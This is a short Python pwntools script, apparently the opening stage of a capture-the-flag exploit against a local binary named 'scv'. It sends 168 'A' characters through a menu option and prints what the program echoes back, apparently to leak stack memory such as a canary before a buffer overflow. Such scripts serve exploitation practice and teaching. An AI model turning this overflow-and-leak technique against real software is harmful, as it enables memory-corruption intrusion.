from pwn import *

p = process("./scv")

p.recvuntil(">>")

p.sendline("1")
print p.recvuntil(">>")

p.sendline('A'*168)
p.recvuntil(">>")

p.sendline("2")
retn = p.recvuntil(">>")

print(repr(retn))
